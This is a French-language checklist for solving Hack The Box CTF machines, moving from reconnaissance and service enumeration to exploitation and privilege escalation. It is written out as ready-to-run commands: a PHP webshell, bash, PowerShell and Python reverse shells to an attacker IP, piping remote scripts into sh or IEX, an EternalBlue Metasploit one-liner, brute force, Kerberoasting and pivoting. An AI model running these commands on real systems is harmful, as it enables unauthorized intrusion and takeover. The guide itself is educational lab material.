# Checklist CTF Hack The Box - Processus Décisionnel

Cette checklist est conçue comme un processus décisionnel évolutif pour résoudre des machines CTF sur Hack The Box. Elle n'est pas une simple liste d'outils, mais un guide structuré qui s'adapte au contexte de la machine cible.

## 1. Reconnaissance

### Stratégie
La phase de reconnaissance vise à obtenir une vue d'ensemble de la cible sans interagir directement avec elle. L'objectif est de comprendre ce que vous affrontez avant de lancer des scans plus intrusifs.

### Étapes

- [ ] **Préparation de l'environnement**
  - [ ] Configurer le fichier `/etc/hosts` avec l'IP de la machine et son nom (`<ip> <machine_name>.htb`)
  - [ ] Créer un répertoire de travail dédié à la machine (`mkdir <machine_name>`)
  - [ ] Préparer un fichier de notes pour documenter toutes les découvertes

- [ ] **Collecte d'informations passives**
  - [ ] Vérifier les informations fournies par HTB (difficulté, tags, description)
    > *Question*: La difficulté indique-t-elle une machine simple ou complexe? Les tags suggèrent-ils des technologies spécifiques?
  - [ ] Rechercher le nom de la machine sur Google/forums HTB (sans spoilers)
    > *Question*: Le nom de la machine pourrait-il être un indice sur la vulnérabilité?

- [ ] **Scan initial de ports**
  - [ ] Exécuter un scan rapide pour identifier les ports ouverts
    ```bash
    sudo nmap -sS -p- --min-rate 5000 <ip> -oN nmap_initial.txt
    ```
    > *Question*: Quels sont les ports inhabituels ou intéressants?
  
  - [ ] Exécuter un scan approfondi sur les ports découverts
    ```bash
    sudo nmap -sC -sV -p <ports> <ip> -oN nmap_detailed.txt
    ```
    > *Question*: Quelles versions de services sont utilisées? Sont-elles obsolètes?

- [ ] **Analyse des résultats initiaux**
  - [ ] Identifier le système d'exploitation probable
    > *Question*: S'agit-il d'une machine Linux ou Windows? Cela influencera l'approche.
  
  - [ ] Lister tous les services découverts par ordre de priorité
    > *Question*: Quels services présentent la plus grande surface d'attaque?
  
  - [ ] Rechercher des vulnérabilités connues pour les versions identifiées
    ```bash
    nmap --script vuln -p <ports> <ip> -oN nmap_vuln.txt
    ```
    > *Question*: Des CVE récents sont-ils associés à ces services?

- [ ] **Reconnaissance DNS (si applicable)**
  - [ ] Tester les transferts de zone
    ```bash
    dig axfr @<ip> <domain>
    ```
  
  - [ ] Rechercher des sous-domaines potentiels
    ```bash
    wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://<ip>" -H "Host: FUZZ.<domain>.htb" --hw 0
    ```
    > *Question*: Y a-t-il des virtual hosts cachés?

### Outils recommandés
- **Nmap** - Pour les scans de ports et services
- **Amass/Subfinder** - Pour la découverte de sous-domaines
- **Whatweb** - Pour l'identification des technologies web
- **Dig/Host** - Pour les requêtes DNS

### Pièges à éviter
- Ne pas se précipiter sur les services évidents (comme le port 80) sans avoir terminé un scan complet
- Ne pas ignorer les ports non standards qui pourraient héberger des services standards
- Attention aux rabbit holes: HTB place parfois des distractions intentionnelles

## 2. Énumération

### Stratégie
L'énumération est l'étape où vous explorez en profondeur chaque service découvert lors de la reconnaissance. L'objectif est d'identifier des vulnérabilités potentielles, des mauvaises configurations ou des informations sensibles qui pourraient être exploitées.

### Étapes

- [ ] **Énumération Web (Ports 80, 443, 8080, etc.)**
  - [ ] Identifier les technologies utilisées
    ```bash
    whatweb http://<ip>
    ```
    > *Question*: Quels CMS, frameworks ou technologies sont utilisés?
  
  - [ ] Capturer une capture d'écran pour référence
    ```bash
    firefox http://<ip> # ou tout autre navigateur
    ```
    > *Question*: Y a-t-il des indices visuels ou des messages d'erreur révélateurs?
  
  - [ ] Examiner le code source de la page
    ```bash
    curl -s http://<ip> | grep -i "password\|user\|admin\|login\|secret\|key"
    ```
    > *Question*: Des commentaires, des chemins de fichiers ou des identifiants sont-ils visibles?
  
  - [ ] Énumérer les répertoires et fichiers
    ```bash
    ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://<ip>/FUZZ -e .php,.txt,.html,.bak
    ```
    > *Question*: Quels sont les chemins intéressants découverts? Y a-t-il des fichiers de sauvegarde?
  
  - [ ] Vérifier les fichiers robots.txt et sitemap.xml
    ```bash
    curl -s http://<ip>/robots.txt
    curl -s http://<ip>/sitemap.xml
    ```
    > *Question*: Des chemins sensibles sont-ils mentionnés?
  
  - [ ] Tester les vulnérabilités web courantes
    - [ ] Injection SQL
      ```bash
      sqlmap -u "http://<ip>/page.php?id=1" --batch --dbs
      ```
      > *Question*: Les paramètres sont-ils vulnérables aux injections?
    
    - [ ] XSS (Cross-Site Scripting)
      ```bash
      # Test manuel avec des payloads comme <script>alert(1)</script>
      ```
    
    - [ ] LFI/RFI (Local/Remote File Inclusion)
      ```bash
      ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<ip>/page.php?file=FUZZ -fw 42
      ```
      > *Question*: Est-il possible d'accéder à des fichiers système?
    
    - [ ] SSRF (Server-Side Request Forgery)
      ```bash
      # Test avec des URLs comme http://localhost/admin
      ```
  
  - [ ] Analyser les formulaires et les mécanismes d'authentification
    > *Question*: Y a-t-il des vulnérabilités dans le processus de login?
  
  - [ ] Tester les en-têtes HTTP personnalisés
    ```bash
    curl -I http://<ip>
    ```
    > *Question*: Des en-têtes inhabituels sont-ils présents?

- [ ] **Énumération SMB (Port 445)**
  - [ ] Lister les partages disponibles
    ```bash
    smbclient -L //<ip>/ -N
    ```
    > *Question*: Y a-t-il des partages accessibles anonymement?
  
  - [ ] Tenter de se connecter aux partages
    ```bash
    smbclient //<ip>/<share> -N
    ```
    > *Question*: Quels fichiers sont disponibles? Contiennent-ils des informations sensibles?
  
  - [ ] Énumérer les utilisateurs SMB
    ```bash
    enum4linux -a <ip>
    ```
    > *Question*: Des noms d'utilisateurs valides ont-ils été découverts?
  
  - [ ] Vérifier les vulnérabilités SMB connues
    ```bash
    nmap --script "smb-vuln*" -p 445 <ip>
    ```
    > *Question*: Le serveur est-il vulnérable à EternalBlue ou à d'autres exploits connus?

- [ ] **Énumération FTP (Port 21)**
  - [ ] Tester l'accès anonyme
    ```bash
    ftp <ip>
    # Utiliser 'anonymous' comme nom d'utilisateur et email comme mot de passe
    ```
    > *Question*: L'accès anonyme est-il autorisé?
  
  - [ ] Lister et télécharger tous les fichiers disponibles
    ```bash
    # Dans la session FTP: ls -la, puis get <file>
    ```
    > *Question*: Y a-t-il des fichiers de configuration ou des sauvegardes?
  
  - [ ] Vérifier si l'upload est possible
    ```bash
    # Dans la session FTP: put test.txt
    ```
    > *Question*: Pouvez-vous uploader des fichiers? Cela pourrait-il mener à une exécution de code?

- [ ] **Énumération SSH (Port 22)**
  - [ ] Identifier la version SSH
    ```bash
    ssh -V <ip>
    ```
    > *Question*: La version est-elle vulnérable?
  
  - [ ] Tester les méthodes d'authentification supportées
    ```bash
    ssh -v <ip>
    ```
    > *Question*: L'authentification par clé est-elle possible?
  
  - [ ] Tester les utilisateurs connus avec des mots de passe faibles
    ```bash
    hydra -L users.txt -P passwords.txt ssh://<ip>
    ```
    > *Question*: Des identifiants par défaut ou faibles sont-ils utilisés?

- [ ] **Énumération des services de base de données (Ports 3306, 5432, 1433, 27017, etc.)**
  - [ ] Identifier le type et la version de la base de données
    ```bash
    nmap -sV -p <port> --script=banner <ip>
    ```
    > *Question*: Quel système de base de données est utilisé?
  
  - [ ] Tester l'accès avec des identifiants par défaut
    ```bash
    # MySQL
    mysql -h <ip> -u root -p
    # PostgreSQL
    psql -h <ip> -U postgres -W
    ```
    > *Question*: L'accès avec des identifiants par défaut est-il possible?
  
  - [ ] Énumérer les bases de données accessibles
    ```bash
    # Dans la session MySQL: SHOW DATABASES;
    ```
    > *Question*: Quelles bases de données contiennent des informations sensibles?

- [ ] **Énumération RPC/NetBIOS (Ports 111, 135, 139)**
  - [ ] Énumérer les services RPC
    ```bash
    rpcinfo -p <ip>
    ```
    > *Question*: Quels services RPC sont exposés?
  
  - [ ] Énumérer les informations NetBIOS
    ```bash
    nbtscan <ip>
    ```
    > *Question*: Quelles informations sur le domaine et les utilisateurs sont disponibles?

- [ ] **Énumération SNMP (Port 161)**
  - [ ] Tester les community strings par défaut
    ```bash
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>
    ```
    > *Question*: Des community strings valides ont-elles été trouvées?
  
  - [ ] Extraire les informations SNMP
    ```bash
    snmpwalk -v2c -c public <ip>
    ```
    > *Question*: Quelles informations système ou de configuration sont exposées?

- [ ] **Énumération SMTP (Port 25)**
  - [ ] Vérifier les commandes SMTP supportées
    ```bash
    nc -nv <ip> 25
    # Taper EHLO test
    ```
    > *Question*: Le serveur supporte-t-il des commandes qui pourraient être abusées?
  
  - [ ] Énumérer les utilisateurs valides
    ```bash
    smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <ip>
    ```
    > *Question*: Pouvez-vous valider des noms d'utilisateurs?

- [ ] **Énumération des services spécifiques à Windows (si applicable)**
  - [ ] Énumérer les informations RPC/MSRPC
    ```bash
    rpcclient -U "" <ip>
    ```
    > *Question*: Pouvez-vous obtenir des informations sur les utilisateurs ou les partages?
  
  - [ ] Énumérer les services WinRM (Port 5985/5986)
    ```bash
    evil-winrm -i <ip> -u Administrator -p 'password'
    ```
    > *Question*: WinRM est-il accessible avec des identifiants connus?
  
  - [ ] Vérifier les vulnérabilités spécifiques à Windows
    ```bash
    crackmapexec smb <ip> --pass-pol
    ```
    > *Question*: Quelles sont les politiques de mot de passe? Y a-t-il des vulnérabilités connues?

### Outils recommandés
- **Web**: Gobuster/Ffuf, Nikto, Burp Suite, SQLmap, Wfuzz
- **SMB**: Enum4linux, Smbclient, CrackMapExec
- **Bases de données**: MySQLClient, PostgreSQL client, MongoDB client
- **Divers**: Hydra (brute force), Metasploit (modules d'énumération)

### Pièges à éviter
- Ne pas se limiter à un seul outil d'énumération (combiner plusieurs approches)
- Ne pas ignorer les services moins courants qui pourraient être mal configurés
- Attention aux rabbit holes: certains services peuvent être des distractions
- Ne pas oublier de documenter tous les résultats, même ceux qui semblent insignifiants
- Ne pas négliger les versions spécifiques des services (elles peuvent indiquer des vulnérabilités précises)


## 3. Exploitation

### Stratégie
L'exploitation est l'étape où vous utilisez les vulnérabilités identifiées pour obtenir un accès initial au système. L'objectif est d'obtenir un shell ou un accès suffisant pour récupérer le flag user.txt. Cette phase nécessite de la créativité et une approche méthodique.

### Étapes

- [ ] **Préparation à l'exploitation**
  - [ ] Prioriser les vulnérabilités découvertes
    > *Question*: Quelle vulnérabilité offre le chemin de moindre résistance?
  
  - [ ] Rechercher des exploits existants
    ```bash
    searchsploit <service> <version>
    ```
    > *Question*: Existe-t-il des exploits publics pour les vulnérabilités identifiées?
  
  - [ ] Préparer l'environnement d'écoute
    ```bash
    # Pour les reverse shells
    nc -lvnp 4444
    ```
    > *Question*: Quel type de shell est le plus approprié (bind ou reverse)?

- [ ] **Exploitation des vulnérabilités Web**
  - [ ] Exploiter les injections SQL
    ```bash
    sqlmap -u "http://<ip>/page.php?id=1" --os-shell
    ```
    > *Question*: Pouvez-vous obtenir un shell via l'injection SQL?
  
  - [ ] Exploiter les failles d'upload de fichiers
    ```bash
    # Préparer un webshell PHP
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    # Tenter de l'uploader et y accéder via http://<ip>/uploads/shell.php?cmd=id
    ```
    > *Question*: Quelles sont les restrictions d'upload? Comment les contourner?
  
  - [ ] Exploiter les LFI/RFI
    ```bash
    # LFI vers RCE via log poisoning
    curl -s "http://<ip>/page.php?file=/var/log/apache2/access.log&cmd=id"
    ```
    > *Question*: Pouvez-vous transformer un LFI en RCE?
  
  - [ ] Exploiter les vulnérabilités d'authentification
    ```bash
    # Brute force de login
    hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
    ```
    > *Question*: Y a-t-il des comptes avec des mots de passe faibles?
  
  - [ ] Exploiter les vulnérabilités SSRF
    ```bash
    # Tester l'accès à des services internes
    curl -s "http://<ip>/page.php?url=http://localhost:8080/admin"
    ```
    > *Question*: Pouvez-vous accéder à des services internes non exposés?

- [ ] **Exploitation des services de fichiers**
  - [ ] Exploiter SMB
    ```bash
    # Utiliser psexec pour exécuter des commandes
    impacket-psexec <username>:<password>@<ip>
    ```
    > *Question*: Avez-vous des identifiants valides pour SMB?
  
  - [ ] Exploiter FTP
    ```bash
    # Si l'upload est possible, uploader un shell et l'exécuter
    ```
    > *Question*: Pouvez-vous uploader et exécuter des fichiers via FTP?
  
  - [ ] Exploiter NFS
    ```bash
    # Monter un partage NFS
    mount -t nfs <ip>:/share /mnt/nfs
    ```
    > *Question*: Pouvez-vous monter des partages NFS et y accéder?

- [ ] **Exploitation des services d'authentification**
  - [ ] Exploiter SSH
    ```bash
    # Si vous avez une clé privée
    chmod 600 id_rsa
    ssh -i id_rsa user@<ip>
    ```
    > *Question*: Avez-vous trouvé des clés SSH privées?
  
  - [ ] Exploiter des identifiants faibles
    ```bash
    hydra -L users.txt -P passwords.txt ssh://<ip>
    ```
    > *Question*: Avez-vous une liste d'utilisateurs potentiels?
  
  - [ ] Exploiter Kerberos (Windows)
    ```bash
    # Kerberoasting
    impacket-GetUserSPNs -request -dc-ip <ip> <domain>/<user>:<password>
    ```
    > *Question*: Avez-vous des identifiants de domaine valides?

- [ ] **Exploitation des vulnérabilités système**
  - [ ] Exploiter des CVE spécifiques
    ```bash
    # Exemple pour EternalBlue
    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <ip>; set LHOST <your_ip>; exploit"
    ```
    > *Question*: La version du système est-elle vulnérable à des exploits connus?
  
  - [ ] Exploiter des mauvaises configurations
    ```bash
    # Exemple pour sudo misconfiguration
    sudo -l # Vérifier les permissions sudo
    ```
    > *Question*: Y a-t-il des binaires avec SUID ou des configurations sudo dangereuses?
  
  - [ ] Exploiter des services mal configurés
    ```bash
    # Exemple pour Jenkins
    curl http://<ip>:8080/script -d "script=println 'whoami'.execute().text"
    ```
    > *Question*: Y a-t-il des interfaces d'administration non sécurisées?

- [ ] **Développement d'exploits personnalisés**
  - [ ] Modifier des exploits existants
    ```bash
    searchsploit -m <exploit_id>
    # Modifier l'exploit selon les besoins
    ```
    > *Question*: Comment adapter un exploit existant à votre cible spécifique?
  
  - [ ] Créer des scripts d'exploitation
    ```bash
    # Exemple de script Python pour une vulnérabilité personnalisée
    ```
    > *Question*: Quelles sont les spécificités de la vulnérabilité qui nécessitent un exploit personnalisé?
  
  - [ ] Tester l'exploit dans un environnement contrôlé
    > *Question*: Votre exploit fonctionne-t-il de manière fiable?

- [ ] **Obtention d'un shell**
  - [ ] Utiliser des payloads de reverse shell
    ```bash
    # Bash
    bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'
    
    # PowerShell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<your_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
    > *Question*: Quel type de reverse shell est le plus approprié pour le système cible?
  
  - [ ] Améliorer le shell obtenu
    ```bash
    # Sur Linux
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Puis Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm
    
    # Sur Windows
    # Utiliser un shell meterpreter ou PowerShell
    ```
    > *Question*: Comment rendre votre shell plus stable et fonctionnel?
  
  - [ ] Vérifier les privilèges obtenus
    ```bash
    # Linux
    id
    
    # Windows
    whoami /all
    ```
    > *Question*: Avez-vous les privilèges nécessaires pour accéder au flag user.txt?

- [ ] **Validation de l'exploitation**
  - [ ] Localiser et lire le flag user.txt
    ```bash
    # Linux
    find / -name user.txt 2>/dev/null
    
    # Windows
    dir /s user.txt
    ```
    > *Question*: Avez-vous réussi à obtenir le flag user.txt?
  
  - [ ] Assurer la persistance (si nécessaire)
    ```bash
    # Créer un utilisateur, ajouter une clé SSH, etc.
    ```
    > *Question*: Comment maintenir l'accès en cas de déconnexion?
  
  - [ ] Documenter la méthode d'exploitation
    > *Question*: Pouvez-vous reproduire l'exploitation de manière fiable?

### Outils recommandés
- **Exploitation générale**: Metasploit Framework, SearchSploit
- **Web**: SQLmap, Commix, Burp Suite
- **Shells**: PayloadAllTheThings (GitHub), Reverse Shell Generator
- **Windows**: Impacket, PowerSploit, SharpCollection
- **Linux**: GTFOBins, LinPEAS

### Pièges à éviter
- Ne pas se précipiter sur des exploits complexes sans vérifier les méthodes simples d'abord
- Ne pas ignorer les erreurs lors de l'exploitation (elles contiennent souvent des indices)
- Attention aux exploits qui peuvent endommager le système et interrompre le CTF
- Ne pas oublier de documenter chaque étape de l'exploitation
- Éviter les exploits bruyants qui pourraient déclencher des alertes (dans un contexte réel)


## 4. Post-Exploitation

### Stratégie
La phase de post-exploitation commence après avoir obtenu un accès initial au système. L'objectif principal est d'élever vos privilèges pour obtenir un accès root/administrateur et récupérer le flag root.txt. Cette phase nécessite une énumération minutieuse des privilèges et une compréhension approfondie des vecteurs d'élévation de privilèges.

### Étapes

- [ ] **Énumération des privilèges**
  - [ ] Collecter des informations sur le système
    ```bash
    # Linux
    uname -a
    cat /etc/issue
    cat /proc/version
    
    # Windows
    systeminfo
    ver
    ```
    > *Question*: Quelle est la version exacte du système d'exploitation? Des exploits kernel sont-ils disponibles?
  
  - [ ] Identifier l'utilisateur actuel et ses privilèges
    ```bash
    # Linux
    id
    sudo -l
    
    # Windows
    whoami /all
    net user <username>
    ```
    > *Question*: Quels privilèges ou groupes spéciaux sont attribués à l'utilisateur actuel?
  
  - [ ] Utiliser des scripts d'énumération automatisés
    ```bash
    # Linux
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    
    # Windows
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
    ```
    > *Question*: Quelles vulnérabilités ou mauvaises configurations ont été identifiées par les scripts?

- [ ] **Élévation de privilèges sur Linux**
  - [ ] Exploiter les binaires SUID
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```
    > *Question*: Y a-t-il des binaires SUID inhabituels ou mal configurés?
  
  - [ ] Exploiter les tâches Cron
    ```bash
    cat /etc/crontab
    ls -la /etc/cron*
    ```
    > *Question*: Y a-t-il des tâches Cron qui s'exécutent en tant que root et sont modifiables?
  
  - [ ] Exploiter les capabilities
    ```bash
    getcap -r / 2>/dev/null
    ```
    > *Question*: Des binaires ont-ils des capabilities dangereuses comme cap_setuid?
  
  - [ ] Exploiter les vulnérabilités sudo
    ```bash
    sudo -l
    ```
    > *Question*: Pouvez-vous exécuter certaines commandes avec sudo? Peuvent-elles être exploitées via GTFOBins?
  
  - [ ] Exploiter les services vulnérables
    ```bash
    ps aux
    ls -la /etc/systemd/system/
    ```
    > *Question*: Y a-t-il des services exécutés en tant que root avec des fichiers modifiables?
  
  - [ ] Exploiter les vulnérabilités du noyau
    ```bash
    searchsploit linux kernel $(uname -r)
    ```
    > *Question*: La version du noyau est-elle vulnérable à des exploits connus?
  
  - [ ] Exploiter les fichiers de configuration sensibles
    ```bash
    find / -writable -type f 2>/dev/null | grep -v "/proc/"
    ```
    > *Question*: Y a-t-il des fichiers de configuration importants qui sont modifiables?

- [ ] **Élévation de privilèges sur Windows**
  - [ ] Exploiter les services vulnérables
    ```powershell
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
    ```
    > *Question*: Y a-t-il des services avec des chemins non cités ou des permissions faibles?
  
  - [ ] Exploiter les tâches planifiées
    ```cmd
    schtasks /query /fo LIST /v
    ```
    > *Question*: Y a-t-il des tâches planifiées qui exécutent des binaires modifiables?
  
  - [ ] Exploiter les DLL manquantes
    ```powershell
    # Utiliser Process Monitor pour identifier les DLL manquantes
    ```
    > *Question*: Pouvez-vous créer une DLL malveillante à un emplacement recherché par un service?
  
  - [ ] Exploiter AlwaysInstallElevated
    ```cmd
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
    > *Question*: La politique AlwaysInstallElevated est-elle activée?
  
  - [ ] Exploiter les autorisations de registre
    ```powershell
    # Vérifier les autorisations sur les clés de registre sensibles
    ```
    > *Question*: Pouvez-vous modifier des clés de registre utilisées par des services privilégiés?
  
  - [ ] Exploiter les vulnérabilités UAC Bypass
    ```powershell
    # Vérifier le niveau UAC
    REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
    ```
    > *Question*: Le système est-il vulnérable à des techniques de contournement UAC connues?
  
  - [ ] Exploiter les vulnérabilités de privilèges spécifiques
    ```powershell
    # Vérifier les privilèges comme SeImpersonatePrivilege
    whoami /priv
    ```
    > *Question*: Avez-vous des privilèges comme SeImpersonate ou SeDebug qui peuvent être exploités?

- [ ] **Techniques d'élévation de privilèges communes**
  - [ ] Exploiter les mots de passe réutilisés
    ```bash
    # Tester les mots de passe trouvés sur d'autres comptes
    su - root
    ```
    > *Question*: Les identifiants découverts fonctionnent-ils pour d'autres utilisateurs ou services?
  
  - [ ] Exploiter les fichiers de configuration
    ```bash
    find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null
    ```
    > *Question*: Des fichiers de configuration contiennent-ils des identifiants en clair?
  
  - [ ] Exploiter l'historique des commandes
    ```bash
    cat ~/.bash_history
    ```
    > *Question*: L'historique des commandes révèle-t-il des informations sensibles?
  
  - [ ] Exploiter les variables d'environnement
    ```bash
    env
    ```
    > *Question*: Des variables d'environnement contiennent-elles des informations sensibles?

- [ ] **Pivoting et mouvement latéral**
  - [ ] Identifier les autres hôtes du réseau
    ```bash
    # Linux
    ip route
    arp -a
    
    # Windows
    ipconfig /all
    arp -a
    ```
    > *Question*: Y a-t-il d'autres systèmes accessibles sur le réseau interne?
  
  - [ ] Configurer un proxy SOCKS
    ```bash
    # Avec SSH
    ssh -D 1080 user@<compromised_host>
    
    # Avec Chisel
    ./chisel server -p 8080 --reverse
    ./chisel client <attacker_ip>:8080 R:socks
    ```
    > *Question*: Comment accéder efficacement aux services internes?
  
  - [ ] Utiliser des techniques de port forwarding
    ```bash
    # SSH port forwarding
    ssh -L 8000:internal_host:80 user@<compromised_host>
    ```
    > *Question*: Quels services internes doivent être exposés pour une exploitation ultérieure?

- [ ] **Extraction du flag root.txt**
  - [ ] Localiser le flag root.txt
    ```bash
    # Linux
    find / -name root.txt 2>/dev/null
    
    # Windows
    dir /s root.txt
    ```
    > *Question*: Où se trouve le flag root.txt?
  
  - [ ] Lire le contenu du flag
    ```bash
    cat /root/root.txt
    ```
    > *Question*: Avez-vous les privilèges nécessaires pour lire le flag?
  
  - [ ] Documenter la méthode d'élévation de privilèges
    > *Question*: Pouvez-vous reproduire l'élévation de privilèges de manière fiable?

- [ ] **Nettoyage (optionnel dans un CTF, mais bonne pratique)**
  - [ ] Supprimer les fichiers uploadés
    ```bash
    rm /tmp/exploit
    ```
    > *Question*: Avez-vous supprimé tous les outils et scripts malveillants?
  
  - [ ] Effacer les traces dans les logs
    ```bash
    # Attention: Dans un CTF, cela peut ne pas être nécessaire ou approprié
    ```
    > *Question*: Quelles traces de votre activité pourraient être visibles?
  
  - [ ] Fermer les connexions et sessions
    ```bash
    # Fermer proprement les shells et connexions
    ```
    > *Question*: Toutes les connexions ont-elles été correctement fermées?

### Outils recommandés
- **Énumération des privilèges**: LinPEAS/WinPEAS, JAWS, Seatbelt
- **Exploitation Linux**: GTFOBins, pspy, linux-exploit-suggester
- **Exploitation Windows**: PowerUp, SharpUp, Watson, Juicy Potato
- **Pivoting**: Chisel, Ligolo, SSF, Proxychains

### Pièges à éviter
- Ne pas se précipiter sur des exploits kernel sans vérifier les méthodes plus simples d'abord
- Ne pas ignorer les fichiers de configuration et l'historique des commandes
- Attention aux exploits qui peuvent rendre le système instable
- Ne pas oublier de documenter chaque étape de l'élévation de privilèges
- Éviter les modifications permanentes du système qui pourraient affecter d'autres participants

## 5. Adaptations spécifiques selon le système

### Stratégie
Les machines CTF sur Hack The Box peuvent être basées sur différents systèmes d'exploitation, principalement Linux et Windows. Chaque système présente des particularités qui nécessitent des approches spécifiques. Cette section fournit des conseils adaptés à chaque type de système pour optimiser votre processus de résolution.

### Spécificités pour les machines Linux

- [ ] **Reconnaissance spécifique à Linux**
  
  La reconnaissance des machines Linux doit porter une attention particulière aux services couramment utilisés dans les environnements Unix. Les distributions Linux dans les CTF sont souvent des variantes de Debian, Ubuntu, CentOS ou Arch Linux. Chaque distribution a ses propres spécificités en termes de gestion des paquets, d'emplacement des fichiers de configuration et de mécanismes de sécurité.
  
  Lors de la phase de reconnaissance, identifiez la distribution spécifique en analysant les bannières des services, les en-têtes HTTP ou les résultats de scan Nmap. Cette information est cruciale car elle détermine les chemins de fichiers, les versions de packages et les vulnérabilités potentielles.
  
  > *Question*: Quelle distribution Linux est utilisée? Est-ce une version obsolète connue pour des vulnérabilités spécifiques?

- [ ] **Énumération spécifique à Linux**
  
  L'énumération sur les systèmes Linux doit se concentrer sur plusieurs aspects clés. Tout d'abord, les permissions de fichiers sont fondamentales dans l'écosystème Linux. Recherchez systématiquement les fichiers avec des permissions incorrectes (SUID, SGID, world-writable) qui pourraient être exploités pour une élévation de privilèges.
  
  Les services spécifiques à Linux comme SSH, NFS, et les serveurs web comme Apache ou Nginx ont leurs propres fichiers de configuration qui peuvent contenir des informations sensibles. Examinez attentivement `/etc/passwd`, `/etc/shadow` (si accessible), `/var/www/`, `/opt/` et `/srv/` qui contiennent souvent des applications personnalisées dans les CTF.
  
  ```bash
  # Rechercher des fichiers de configuration intéressants
  find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null
  
  # Vérifier les fichiers récemment modifiés
  find / -type f -mtime -7 2>/dev/null
  ```
  
  > *Question*: Y a-t-il des applications personnalisées ou des services non standards installés dans des répertoires comme /opt ou /srv?

- [ ] **Exploitation spécifique à Linux**
  
  Les machines Linux dans les CTF présentent souvent des vulnérabilités liées à des applications web personnalisées, des services mal configurés ou des binaires avec des permissions incorrectes. Contrairement aux environnements Windows, l'exploitation sur Linux repose souvent sur l'abus de permissions de fichiers, de variables d'environnement ou de binaires SUID.
  
  Les shells Linux sont généralement plus faciles à obtenir et à maintenir que sur Windows. Privilégiez les reverse shells en Python, Bash ou Perl selon ce qui est disponible sur le système cible. N'oubliez pas de stabiliser votre shell avec `python -c 'import pty; pty.spawn("/bin/bash")'` suivi de `stty raw -echo; fg` pour obtenir un shell pleinement interactif.
  
  ```bash
  # Exemple de reverse shell Python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.X",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```
  
  > *Question*: Quels interpréteurs sont disponibles sur le système pour créer un reverse shell (Python, Perl, Ruby, etc.)?

- [ ] **Post-exploitation spécifique à Linux**
  
  L'élévation de privilèges sur Linux dans les CTF suit généralement des schémas prévisibles. Commencez toujours par les vecteurs classiques: binaires SUID, tâches cron, sudo mal configuré, et capabilities. Utilisez systématiquement LinPEAS pour automatiser cette recherche.
  
  Les CTF Linux comportent souvent des indices dans les fichiers de l'utilisateur courant. Examinez toujours `.bash_history`, les fichiers dans `/home/user/` et les fichiers cachés (commençant par un point). Les développeurs laissent souvent des sauvegardes, des scripts ou des notes qui contiennent des informations cruciales.
  
  ```bash
  # Vérifier les fichiers cachés
  find /home -type f -name ".*" 2>/dev/null
  
  # Vérifier les tâches cron de tous les utilisateurs
  for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l 2>/dev/null; done
  ```
  
  > *Question*: Y a-t-il des scripts personnalisés créés par les utilisateurs qui s'exécutent avec des privilèges élevés?

### Spécificités pour les machines Windows

- [ ] **Reconnaissance spécifique à Windows**
  
  La reconnaissance des machines Windows nécessite une attention particulière aux services spécifiques à cet écosystème. Recherchez les ports associés à Active Directory (même si la machine n'est pas une AD box), SMB, RDP, WinRM et les services web IIS. La version précise de Windows est cruciale car les vecteurs d'exploitation varient considérablement entre Windows 7, 8, 10 ou les versions serveur.
  
  Les machines Windows dans les CTF exposent souvent des partages SMB mal configurés ou des services web avec des vulnérabilités d'authentification. Utilisez des outils comme CrackMapExec pour une énumération initiale efficace.
  
  ```bash
  # Énumération SMB approfondie
  crackmapexec smb <ip> --shares
  ```
  
  > *Question*: S'agit-il d'une version client (Windows 7/10) ou serveur (2012/2016/2019)? Les vecteurs d'attaque diffèrent significativement.

- [ ] **Énumération spécifique à Windows**
  
  L'énumération Windows doit se concentrer sur les services exposés, les partages réseau, et les applications installées. Contrairement à Linux, Windows stocke beaucoup d'informations dans le registre, qui peut contenir des identifiants ou des configurations sensibles.
  
  Les applications web sur Windows sont souvent hébergées sur IIS et peuvent utiliser des technologies .NET, ASP classique ou PHP. Chacune a ses propres vulnérabilités et emplacements de fichiers de configuration. Examinez attentivement `C:\inetpub\wwwroot\` et `C:\Windows\Temp\` qui contiennent souvent des fichiers intéressants dans les CTF.
  
  ```bash
  # Si vous avez un shell, énumérer les applications installées
  wmic product get name,version
  
  # Vérifier les utilisateurs locaux
  net user
  ```
  
